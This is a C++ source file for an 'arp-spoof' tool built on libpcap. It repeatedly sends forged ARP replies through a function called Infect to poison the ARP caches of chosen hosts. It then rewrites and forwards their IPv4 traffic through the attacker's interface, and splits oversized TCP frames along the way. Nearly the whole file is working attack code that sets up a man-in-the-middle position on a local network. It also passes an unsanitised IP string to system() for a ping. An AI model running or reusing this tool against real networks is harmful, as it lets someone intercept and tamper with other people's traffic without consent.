#include <iostream>
#include <string>
#include <list>
#include <map>
#include <vector>
#include <ctime>

#include <cstdlib>

#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <unistd.h>

#include "pcap.h"
#include "../../include/mac.h"
#include "../../include/ethhdr.h"
#include "../../include/arphdr.hpp"
#include "../../include/iphdr.hpp"
#include "../../include/tcphdr.hpp"

#define TICK_TIME           50000
#define MAX_MTU             1500
#define MAX_MSS             1400//1460
#define UDP_HEADER_SIZE     8
#define PSEUDO_HDR_SIZE     96

#define MAKEWORD(a,b)   ((uint16_t)(((uint8_t)(a))|(((uint16_t)((uint8_t)(b)))<<8)))

using namespace std;

struct Flow {
    Ip sip_;
    Ip tip_;

    Flow() {}
    Flow(const string senderIP, const string targetIP) { sip_ = senderIP; tip_ = targetIP; }


    bool operator==(const Flow& f) { if(sip_ == f.sip_ && tip_ == f.tip_) return true; return false; }
};

struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct Packet {
    pcap_pkthdr* header;
    u_char* buf;
};

void usage();
bool parse(int argc);
list<Flow> GetFlowList(int argc, char* argv[]);
bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable);
Mac GetInterfaceMac(string interface);
Mac ResolveMac(const string interface, const Ip ip);
pcap_t* OpenPcap(const string Interface);
bool SetPcapFilter(pcap_t* pcap, string filterExpression);
bool SendPacket(pcap_t* pcap, uint8_t* data,const int size);
Packet ReadPacket(pcap_t* pcap);
void SetIpChecksum(PIpHdr ipHeader);
void SetTcpChecksum(const uint16_t payloadLen, const PIpHdr ipHeader, PTcpHdr tcpHeader);
void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket);
void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket);
//bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac);
bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP);
bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable);


Ip g_myIp(string("192.168.0.106"));
Ip g_hostIp(string("192.168.0.100"));
Ip g_netMask(string("255.255.255.0"));

int main(int argc, char* argv[])
{
    try {
        if(!parse(argc)) throw runtime_error("Failed to parse");

        string interface(argv[1]);

        Mac attackMac = GetInterfaceMac(interface);

        list<Flow> flowList = GetFlowList(argc, argv);
        if(flowList.empty()) throw runtime_error("Failed to get flow list");

        map<Ip, Mac> arpTable{};
        if(!GetArpTable(interface, flowList, arpTable)) throw runtime_error("Failed to get arp table");

        pcap_t* pcap = OpenPcap(interface);
        if(pcap == NULL) throw runtime_error("Failed to open pcap");

        //packet trace speed
        string filterExp = "not host " + string(g_hostIp);

        if(!SetPcapFilter(pcap, filterExp)) throw runtime_error("Failed to set filter");

        int currentTime = -TICK_TIME;
        Packet rPacket;

        do {
            if((clock() - currentTime) > TICK_TIME) {
                currentTime = clock();

                for(Flow& f : flowList)
                    if(!Infect(pcap, attackMac, arpTable[f.tip_], f.sip_, f.tip_)) throw runtime_error("Failed to infect");
            }

            //while
            rPacket = ReadPacket(pcap);

            PEthHdr etherHeader = reinterpret_cast<PEthHdr>(rPacket.buf);
            PArpHdr arpHeader = reinterpret_cast<PArpHdr>(rPacket.buf + sizeof(EthHdr));
            PIpHdr ipHeader = reinterpret_cast<PIpHdr>(rPacket.buf + sizeof(EthHdr));
            //PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(rPacket.buf + sizeof(EthHdr) + ipHeader->len());

            for(const Flow& f : flowList) {
                //arp
                //sender -> target
                if(etherHeader->type() == EthHdr::Arp && (ntohl(arpHeader->sip_) == f.sip_ && ntohl(arpHeader->tip_) == f.tip_)) {
                    if(!Infect(pcap, attackMac, arpTable[f.tip_], f.sip_, f.tip_)) {
                        cout<<"Failed to infect \n";
                    }
                    break;
                }

                //icmp
                //tcp
                //udp
                //sender -> target
                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->sip_) == f.sip_ && ntohl(ipHeader->dip_) != g_myIp)) {
                    etherHeader->smac_ = attackMac;
                    etherHeader->dmac_ = arpTable[f.tip_];

                    //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
                    if(rPacket.header->len > MAX_MTU)
                        //JumboPacketProcessing(pcap, rPacket);
                        JumboFrameTcpProcessing(pcap, rPacket);
                    else
                        if(!SendPacket(pcap, rPacket.buf, rPacket.header->caplen)) cout<<"Single"<<endl;

                    break;
                }

                //target -> sender
                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->dip_) == f.sip_ && ntohl(ipHeader->dip_) != g_myIp)) {
                    etherHeader->smac_ = attackMac;
                    //etherHeader->dmac_ = arpTable[f.tip_];
                    etherHeader->dmac_ = arpTable[f.sip_];

                    //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
                    if(rPacket.header->len > MAX_MTU)
                        //JumboPacketProcessing(pcap, rPacket);
                        JumboFrameTcpProcessing(pcap, rPacket);
                    else
                        if(!SendPacket(pcap, rPacket.buf, rPacket.header->caplen)) cout<<"Single"<<endl;

                    break;
                }
            }
        }while(true);

        Recover(pcap, flowList, arpTable);
        pcap_close(pcap);

    }catch(const exception& e) {
        cerr<<"[main] "<<e.what()<<endl;
        return -1;
    }
}

void usage() {
    string ret = " syntax arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...] \n sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2";
    cout<<ret<<endl;
}

bool parse(int argc) {
    if(argc < 2 || argc % 2 != 0) {
        usage();
        return false;
    }

    return true;
}

list<Flow> GetFlowList(int argc, char* argv[]) {
    list<Flow> flowList_{};

    for(int i=2; i<argc; i+= 2) {
        flowList_.push_back(Flow(argv[i], argv[i+1]));
        //flowList_.push_back(Flow(argv[i+1], argv[i]));
    }

    return flowList_;
}


bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable) {
    try {
        for(const Flow& f : flowList) {
            if(!arpTable.count(f.sip_)) {
                Mac tmp = ResolveMac(interface, f.sip_);
                if(tmp.isNull()) throw runtime_error("Failed to resolve sender ip");

                arpTable[f.sip_] = tmp;
            }

            if(!arpTable.count(f.tip_)) {
                Mac tmp = ResolveMac(interface, f.tip_);
                if(tmp.isNull()) throw runtime_error("Failed to resolve target ip");

                arpTable[f.tip_] = tmp;
            }
        }
    }catch(const exception& e ) {
        cerr<<"GetArpTable : "<<e.what()<<endl;
        return false;
    }

    return true;
}

Mac GetInterfaceMac(const string interface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    Mac ret{};

    ifreq ifr{};

    strncpy(ifr.ifr_ifrn.ifrn_name, interface.c_str(), IFNAMSIZ - 1);

    try {
        if(sock < 0)
            throw runtime_error("Failed to creat socket");

        if(ioctl(sock, SIOCGIFHWADDR, &ifr) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(ifr.ifr_ifru.ifru_hwaddr.sa_data);
    }
    catch(const exception& e) {
        cerr<<"GetInterfaceMac : "<<e.what() <<endl;
        cerr<<"Error : "<< errno <<" (" << strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

Mac ResolveMac(const string interface, const Ip ip) {
    Mac ret{};

    string cmd = "ping -c 1  " + string(ip);
    system(cmd.c_str());

    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0) throw runtime_error("Failed to create socket");

        arpreq req{};

        req.arp_pa.sa_family = AF_INET;
        strncpy(req.arp_dev, interface.c_str(), IFNAMSIZ - 1);
        reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr.s_addr = htonl(ip);


        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"GetMacAddress : "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

pcap_t* OpenPcap(const string interface) {
    pcap_t* pcap;
    char errBuf[PCAP_ERRBUF_SIZE]{};

    pcap = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1, errBuf);
    if(pcap == NULL)
        cerr<<"OpenPcap : "<<"Failed to open pcap : " + string(errBuf) <<endl;

    return pcap;
}
bool SetPcapFilter(pcap_t* pcap, string filterExpression) {
    bpf_program bp{};

    try {
        if(pcap_compile(pcap, &bp, filterExpression.c_str(), 1, g_netMask) == PCAP_ERROR) throw runtime_error("Failed to call pcap_compile");
        if(pcap_setfilter(pcap, &bp) == PCAP_ERROR) throw runtime_error("Failed to call pcap_setfilter");
    }catch (const exception& e) {
        cerr<<"[SetPcapFilter] "<< e.what()<<endl;
        cout<< "ERROR : "<<pcap_geterr(pcap) << endl;
        return false;
    }

    return true;
}

bool SendPacket(pcap_t* pcap, uint8_t* data, const int size) {
    if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(data), size) == -1) {
        cerr<<"[SendPacket] "<<"Failed to send packet "<<endl;
        cerr<<"ERROR : "<<pcap_geterr(pcap)<<endl;
        return false;
    }

    return true;
}

Packet ReadPacket(pcap_t* pcap) {
    Packet packet{};
    //vector<Packet> packets{};

    while(pcap_next_ex(pcap, &packet.header, (const u_char**)&packet.buf) != 1);
    // while(pcap_next_ex(pcap, &packet.header, (const u_char**)&packet.buf) == 1) {
    //     packets.push_back(packet);
    //     //usleep(1000);
    // }

    //cout<< "Packet cnt : " << packets.size() << endl;

    return packet;
}

void SetIpChecksum(PIpHdr ipHeader) {
    uint8_t* data = reinterpret_cast<uint8_t*>(ipHeader);
    uint32_t len = ipHeader->len();

    ipHeader->headerChecksum_ = 0;

    uint32_t acc = 0;

    for(int i=0; i + 1< len; i+=2)
        acc += MAKEWORD(data[i], data[i + 1]);

    if(len & 1) acc+= static_cast<uint16_t>(data[len-1] << 8);
    while(acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);

    ipHeader->headerChecksum_ = ~acc;
}

void SetTcpChecksum(const uint16_t payloadLen, const PIpHdr ipHeader, PTcpHdr tcpHeader) {
    uint16_t len = tcpHeader->len() + payloadLen;

    tcpHeader->checksum_ = 0;

    TcpHdr::PseudoHdr pseudoHeader{};

    pseudoHeader.sip_ = ipHeader->sip_;
    pseudoHeader.dip_ = ipHeader->dip_;
    pseudoHeader.reserved_ = 0;
    pseudoHeader.protocol_ = ipHeader->protocolId_;
    pseudoHeader.len_ = htons(len);

    uint32_t acc = 0;

    uint8_t* pseudoHeaderPtr = reinterpret_cast<uint8_t*>(&pseudoHeader);

    for(int i = 0; i + 1 < sizeof(TcpHdr::PseudoHdr); i += 2)
        acc += MAKEWORD(pseudoHeaderPtr[i], pseudoHeaderPtr[i + 1]);

    uint8_t* tcpHeaderPtr = reinterpret_cast<uint8_t*>(tcpHeader);

    for(int i = 0; i + 1 < len; i += 2)
        acc += MAKEWORD(tcpHeaderPtr[i], tcpHeaderPtr[i + 1]);

    if(len & 1) acc += static_cast<uint16_t>(tcpHeaderPtr[len - 1] << 8);

    while(acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);

    tcpHeader->checksum_ = ~acc;
}

void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket) {
    PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
    PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));

    //udp or tcp
    const int ipHeaderLen = oriIpHeader->len();
    const int totalHeaderLen = sizeof(EthHdr) + ipHeaderLen;
    const int maxFragmentPacketSize = MAX_MTU - ipHeaderLen;
    int remainingPacketSize = jPacket.header->caplen - sizeof(EthHdr) - ipHeaderLen;

    int sendedPacketSize = 0;
    int fragmentPacketSize = 0;
    int fragmentOffset = 0;

    while(remainingPacketSize > 0) {
        fragmentPacketSize = maxFragmentPacketSize > remainingPacketSize
                                 ? remainingPacketSize : maxFragmentPacketSize;

        unique_ptr<uint8_t[]> fragmentPacketBuf(new uint8_t[fragmentPacketSize + totalHeaderLen]);
        //header
        memcpy(fragmentPacketBuf.get(), jPacket.buf, totalHeaderLen);

        //data
        memcpy(fragmentPacketBuf.get() + totalHeaderLen, jPacket.buf + totalHeaderLen + sendedPacketSize, fragmentPacketSize);

        PIpHdr ipHeader = reinterpret_cast<PIpHdr>(fragmentPacketBuf.get() + sizeof(EthHdr));

        ipHeader->flags_fragOffset_ = remainingPacketSize > maxFragmentPacketSize
                                          ? htons(IpHdr::IP_FLAGS_TYPE::MF | fragmentOffset)
                                          : htons(IpHdr::IP_FLAGS_TYPE::RESORVED | fragmentOffset);

        ipHeader->totalPacketLen_ = htons(ipHeaderLen + fragmentPacketSize);
        SetIpChecksum(ipHeader);


        remainingPacketSize -= fragmentPacketSize;
        sendedPacketSize += fragmentPacketSize;
        fragmentOffset += fragmentPacketSize / 8;

        SendPacket(pcap, reinterpret_cast<uint8_t*>(fragmentPacketBuf.get()), totalHeaderLen + fragmentPacketSize);
    }
}

void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket) {
    PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
    PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));
    PTcpHdr oriTcpHeader = reinterpret_cast<PTcpHdr>(jPacket.buf + sizeof(EthHdr) + oriIpHeader->len());

    const uint32_t totalHeaderLen = sizeof(EthHdr) + oriIpHeader->len() + oriTcpHeader->len();
    uint32_t tcpPayloadSize = oriIpHeader->totalLen() - oriIpHeader->len() - oriTcpHeader->len();

    uint32_t sendBytes = 0, sendedBytes = 0;

    while(tcpPayloadSize) {
        sendBytes = tcpPayloadSize > MAX_MSS ? MAX_MSS : tcpPayloadSize;
        unique_ptr<uint8_t> segmentPacket(new uint8_t[MAX_MSS + totalHeaderLen]);

        //header
        memcpy(segmentPacket.get(), jPacket.buf, totalHeaderLen);
        //data
        memcpy(segmentPacket.get() + totalHeaderLen, jPacket.buf + totalHeaderLen + sendedBytes, sendBytes);



        PIpHdr ipHeader = reinterpret_cast<PIpHdr>(segmentPacket.get() + sizeof(EthHdr));
        ipHeader->totalPacketLen_ = htons(oriIpHeader->len() + oriTcpHeader->len() + sendBytes);
        //id?
        ipHeader->id_ += (1 << 8);
        //checksum?
        SetIpChecksum(ipHeader);

        PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(segmentPacket.get() + sizeof(EthHdr) + ipHeader->len());
        tcpHeader->seqNumber_ =  htonl(ntohl(oriTcpHeader->seqNumber_) + sendedBytes);
        //checksum?
        SetTcpChecksum(sendBytes, ipHeader, tcpHeader);

        sendedBytes += sendBytes;
        tcpPayloadSize -= sendBytes;

        if(!SendPacket(pcap, segmentPacket.get(), totalHeaderLen + sendBytes)) {
            cout<<"jumbo"<<endl;
        }
    }
}

//bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac) {
bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP) {
    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet{};

        packet.eth_.dmac_ = targetMac;
        packet.arp_.tmac_ = targetMac;

        packet.eth_.smac_ = attackerMac;
        packet.arp_.smac_ = attackerMac;

        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
        packet.arp_.protocolType_ = htons(EthHdr::Ip4);
        packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
        packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
        packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);

        packet.arp_.sip_ = htonl(senderIP);
        packet.arp_.tip_ = htonl(targetIP);

        SendPacket(pcap, reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));

    }catch(const std::exception& e) {
        cerr<<"Failed to infect : "<<e.what()<<endl;
        return false;
    }
    return true;
}

bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable) {
    for(Flow& f : flowList)
        if(!Infect(pcap, arpTable[f.sip_], arpTable[f.tip_], f.sip_, f.tip_)) return false;

    return true;
}
